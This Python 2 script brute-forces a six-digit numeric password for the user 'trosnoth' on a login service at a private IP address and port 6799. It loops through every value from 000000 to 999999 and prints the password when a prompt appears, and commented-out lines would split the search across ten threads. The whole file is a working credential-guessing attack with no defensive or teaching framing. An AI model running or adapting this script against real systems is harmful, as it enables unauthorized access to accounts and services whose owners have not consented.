import socket, threading

def attemptLogin(username, password):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.137.1", 6799))
	rx = 0
	while not rx == ":":
		rx = s.recv(1)
	s.send(username+"\r\n")
	rx = 0
	while not rx == ":":
		rx = s.recv(1)
	s.send(password+"\r\n")

	while rx != ">":
		rx = s.recv(1)
		if not rx:
			break
	if not rx:
		return False
	else:
		return True
	s.close()

msgs = []

def scanInRange(bottom, top):
	for a in range(bottom, top):
		if attemptLogin("trosnoth", str(a).zfill(6)):
			print "Password:", str(a).zfill(6)
			quit()
		print str(a).zfill(6)
	
#t1 = threading.Thread(target=scanInRange, args=(0, 100000))
#t2 = threading.Thread(target=scanInRange, args=(100001, 200000))
#t3 = threading.Thread(target=scanInRange, args=(200001, 300000))
#t4 = threading.Thread(target=scanInRange, args=(300001, 400000))
#t5 = threading.Thread(target=scanInRange, args=(400001, 500000))
#t6 = threading.Thread(target=scanInRange, args=(500001, 600000))
#t7 = threading.Thread(target=scanInRange, args=(600001, 700000))
#t8 = threading.Thread(target=scanInRange, args=(700001, 800000))
#t9 = threading.Thread(target=scanInRange, args=(800001, 900000))
#t10= threading.Thread(target=scanInRange, args=(900001, 999999))

#t1.start()
#t2.start()
#t3.start()
#t4.start()
#t5.start()
#t6.start()
#t7.start()
#t8.start()
#t9.start()
#t10.start()

#while True3
#	for msg in msgs:
#		print msg


scanInRange(0, 999999)
